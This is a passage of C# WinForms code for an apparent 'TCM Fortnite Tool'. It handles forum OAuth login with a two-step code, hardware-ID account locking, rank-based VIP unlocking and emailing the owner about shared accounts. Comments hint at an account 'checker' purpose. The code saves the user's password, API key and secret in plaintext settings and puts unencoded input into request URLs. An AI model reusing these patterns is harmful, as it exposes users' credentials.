                        if (LoginFinal1.Contains("Invalid client."))
                        {
                            MessageBox.Show("API Key OR Api Key Password Seems To Be Wrong, Double Check It!");
                            return;
                        }
                        if (LoginFinal1.Contains("Two-step verification required"))
                        {
                            MessageBox.Show("Seems As Though Your Account Has Two-Step Enabled, Please Input The Two-Step Code!");
                            Is2FactorEnabled.Checked = true;
                            return;
                        }
                        if (!LoginFinal1.Contains("access_token"))
                        {
                            MessageBox.Show("Login Appears To Be Wrong, Give It another Go Maybe?");
                        }
                        else if (LoginFinal1.Contains("access_token"))
                        {
                            CanSeeDiscord = true;
                            MessageBox.Show("Hello And Welcome To TCM Fortnite Tool!");
                            MessageBox.Show("We Hope You Enjoy The Tool!");
                            Settings.Default["Username"] = ForumUser.Text;
                            Settings.Default["Password"] = ForumPassword.Text;
                            Settings.Default["APIkey"] = ApiKeyTextBox.Text;
                            Settings.Default["APISecret"] = ApiSecretTextBox.Text;
                            Settings.Default.Save();
                            //Checks If User Is Sharing Account Or Not!
                            if (ForumUser.Text != "Random")
                            {
                                try
                                {
                                    FinalEncrypt = FinalHWID;
                                    string AddedYet = httpRequest.Get("https://tcmtools.com/CheckerStuff/HWIDLock/VerifyUser.php?a=cpu&username=" + ForumUser.Text).ToString();
                                    if (AddedYet == "0")
                                    {
                                        string AddNewUser = httpRequest.Get("https://tcmtools.com/CheckerStuff/HWIDLock/VerifyUser.php?a=add-cpu&username=" + ForumUser.Text + "&cpu=" + FinalEncrypt).ToString();
                                    }
                                    else if (AddedYet == "1")
                                    {
                                        string CheckUserData = httpRequest.Get("https://tcmtools.com/CheckerStuff/HWIDLock/VerifyUser.php?a=check-cpu&username=" + ForumUser.Text + "&cpu=" + FinalEncrypt).ToString();
                                        if (CheckUserData == "Match")
                                        {
                                            MessageBox.Show("This Account Is Locked To Another Account!", "ERROR ACCOUNT LOCKED!");
                                            MessageBox.Show("Please contact TrynCatchMe For Help, Or Don't Share Accounts.. Simple..", "ERROR ACCOUNT LOCKED!");
                                            MessageBox.Show("If You Had VIP, That Will Now Be Disabled.", "ERROR ACCOUNT LOCKED!");
                                            NoneVIPAccess();
                                        }
                                    }
                                }
                                catch (Exception EX)
                                {
                                    MessageBox.Show(EX.Message);
                                    NoneVIPAccess();
                                }
                            }
                            //END CHECK
                            enterprogram = true;
                            nsButton3.Enabled = false;
                            nsButton3.ForeColor = Color.Black;
                            ShowNotification("Hello", "Successfully Logged In!");
                            LogoutButton.Visible = true;
                            nsButton3.Visible = false;
                            nsButton5.Visible = false;
                            nsButton7.Visible = false;
                            APIAccess.Visible = false;
                            JToken AccessToken = JObject.Parse(LoginFinal1)["access_token"];
                            string Access = AccessToken.ToString();
                            string FinalResponseShit = httpRequest.Get("https://tcmtools.com/community/api/index.php?users/me&oauth_token=" + Access).ToString();
                            JToken GroupRanks = JObject.Parse(FinalResponseShit)["user"]["user_groups"];
                            string UserRank = GroupRanks.ToString();
                            if (UserRank.Contains("Owner") && UserRank.Contains("5"))
                            {
                                MessageBox.Show("Welcome Owner, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else if (UserRank.Contains("Administrative") && UserRank.Contains("3"))
                            {
                                MessageBox.Show("Welcome Admin, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else if (UserRank.Contains("Moderating") && UserRank.Contains("4"))
                            {
                                MessageBox.Show("Welcome Moderator, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else if (UserRank.Contains("Premium") && UserRank.Contains("6"))
                            {
                                MessageBox.Show("Welcome Premium User, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else
                            {
                                ShowNotification("Hello", "VIP Not Found");
                                ShowNotification("Hello", "You Should Consider Getting It.");
                                ShowNotification("Hello", "Visit TCMTools.com To Upgrade!");
                                ShowNotification("Hello", "Enjoy The Tool!");
                                NoneVIPAccess();
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                        }
                        else
                        {
                            MessageBox.Show("An Unknown Error Has Occured, Please Try Again Later!");
                            MessageBox.Show("It is possible your account has been disabled/banned.");
                            NoneVIPAccess();
                            MainTabControl.TabPages.Remove(WelcomeWindow);
                        }
                    }
                    else if (Is2FactorEnabled.Checked)
                    {
                        string LoginParams = string.Format("token&grant_type=password&username=" + username + "&password=" + password + "&client_id=" + apikey + "&client_secret=" + apisecret + "&tfa_provider=totp&code=" + TwoFACodeBox.Text);
                        string LoginFinal1 = httpRequest.Post("https://tcmtools.com/community/api/index.php?oauth/token", LoginParams, "application/x-www-form-urlencoded").ToString();
                        if (LoginFinal1.Contains("The two-step verification value could not be confirmed. Please try again."))
                        {
                            MessageBox.Show("2Step Code Seems To Be Invalid, Maybe Give It Another Go?");
                            return;
                        }
                        if (LoginFinal1.Contains("Invalid client."))
                        {
                            MessageBox.Show("API Key OR Api Key Password Seems To Be Wrong, Double Check It!");
                            return;
                        }
                        if (!LoginFinal1.Contains("access_token"))
                        {
                            MessageBox.Show("Login Appears To Be Wrong, Give It another Go Maybe?");
                        }
                        else if (LoginFinal1.Contains("access_token"))
                        {
                            CanSeeDiscord = true;
                            MessageBox.Show("Hello And Welcome To TCM Fortnite Tool!");
                            MessageBox.Show("We Hope You Enjoy The Tool!");
                            Settings.Default["Username"] = ForumUser.Text;
                            Settings.Default["Password"] = ForumPassword.Text;
                            Settings.Default["APIkey"] = ApiKeyTextBox.Text;
                            Settings.Default["APISecret"] = ApiSecretTextBox.Text;
                            Settings.Default.Save();
                            //Checks If User Is Sharing Account Or Not!
                            try
                            {
                                FinalEncrypt = FinalHWID;
                                string AddedYet = httpRequest.Get("https://tcmtools.com/CheckerStuff/HWIDLock/VerifyUser.php?a=cpu&username=" + ForumUser.Text).ToString();
                                if (AddedYet == "0")
                                {
                                    string AddNewUser = httpRequest.Get("https://tcmtools.com/CheckerStuff/HWIDLock/VerifyUser.php?a=add-cpu&username=" + ForumUser.Text + "&cpu=" + FinalEncrypt).ToString();
                                }
                                else if (AddedYet == "1")
                                {
                                    string CheckUserData = httpRequest.Get("https://tcmtools.com/CheckerStuff/HWIDLock/VerifyUser.php?a=check-cpu&username=" + ForumUser.Text + "&cpu=" + FinalEncrypt).ToString();
                                    if (CheckUserData == "Match")
                                    {
                                        try
                                        {
                                            string GUID = GetSoftwareId().ToString();
                                            EmailSenderAPI("Someone Shared An Account!", "mailer@fortnite.exposed", "TCM Fortnite Tool", "tcmchecker@gmail.com", "Hey, Just Wanted To Let You Know It Looks Like " + ForumUser.Text + " Was Trying To Use A Shared Account<br><br><br>Forum Username: " + ForumUser.Text + "<br><br>Forum Encrypted Hash: " + FinalEncrypt + "<br><br>Ban GUID To Add: " + GUID);
                                        }
                                        catch { }
                                        NoneVIPAccess();
                                        ShowNotification("Hello", "This Account Is Locked To Another Account!");
                                        ShowNotification("Hello", "Please contact TrynCatchMe For Help, Or Don't Share Accounts.. Simple..");
                                        ShowNotification("Hello", "If You Had VIP, That Will Now Be Disabled.");
                                    }
                                }
                            }
                            catch { NoneVIPAccess(); }
                            //END CHECK
                            enterprogram = true;
                            nsButton3.Enabled = false;
                            nsButton3.ForeColor = Color.Black;
                            ShowNotification("Hello", "Successfully Logged In!");
                            LogoutButton.Visible = true;
                            nsButton3.Visible = false;
                            nsButton5.Visible = false;
                            nsButton7.Visible = false;
                            APIAccess.Visible = false;
                            JToken AccessToken = JObject.Parse(LoginFinal1)["access_token"];
                            string Access = AccessToken.ToString();
                            string FinalResponseShit = httpRequest.Get("https://tcmtools.com/community/api/index.php?users/me&oauth_token=" + Access).ToString();
                            JToken GroupRanks = JObject.Parse(FinalResponseShit)["user"]["user_groups"];
                            string UserRank = GroupRanks.ToString();
                            if (UserRank.Contains("Owner") && UserRank.Contains("5"))
                            {
                                MessageBox.Show("Welcome Owner, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else if (UserRank.Contains("Administrative") && UserRank.Contains("3"))
                            {
                                MessageBox.Show("Welcome Admin, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else if (UserRank.Contains("Moderating") && UserRank.Contains("4"))
                            {
                                MessageBox.Show("Welcome Moderator, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else if (UserRank.Contains("Premium") && UserRank.Contains("6"))
                            {
                                MessageBox.Show("Welcome Premium User, Premium Features Have Been Unlocked!");
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                            else
                            {
                                ShowNotification("Hello", "VIP Not Found");
                                ShowNotification("Hello", "You Should Consider Getting It.");
                                ShowNotification("Hello", "Visit TCMTools.com To Upgrade!");
                                ShowNotification("Hello", "Enjoy The Tool!");
                                NoneVIPAccess();
                                MainTabControl.TabPages.Remove(WelcomeWindow);
                            }
                        }
                        else
                        {
                            MessageBox.Show("An Unknown Error Has Occured, Please Try Again Later!");
                            NoneVIPAccess();
                            MainTabControl.TabPages.Remove(WelcomeWindow);
                        }
                    }
                }
            }
            catch
            {
                MessageBox.Show("An Unknown Error Has Occured, Please Try Again Later!");
                MessageBox.Show("It is possible your account has been disabled/banned.");
                NoneVIPAccess();
                MainTabControl.TabPages.Remove(WelcomeWindow);
            }
        }

        private void APIAccess_Click(object sender, EventArgs e)
        {
            Process.Start("https://tcmtools.com/community/index.php?account/api");
            Process.Start("https://tcmtools.com/community/index.php?threads/how-to-get-an-api-key-and-login-to-program.47/#post-95");
        }

        private void Is2FactorEnabled_CheckedChanged(object sender)
        {
            if (Is2FactorEnabled.Checked)
            {
                bunifuTransition1.AnimationType = BunifuAnimatorNS.AnimationType.Mosaic;
                bunifuTransition1.ShowSync(twofactorlabel);
                bunifuTransition1.ShowSync(TwoFACodeBox);
                Settings.Default["TwoFALock"] = "True";
            }
            else if (!Is2FactorEnabled.Checked)
            {
                bunifuTransition1.AnimationType = BunifuAnimatorNS.AnimationType.Mosaic;
                bunifuTransition1.HideSync(twofactorlabel);
                bunifuTransition1.HideSync(TwoFACodeBox);
                Settings.Default["TwoFALock"] = "False";
            }
        }

        private void LogoutButton_Click_2(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// This is the email access checker END
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
    }

}
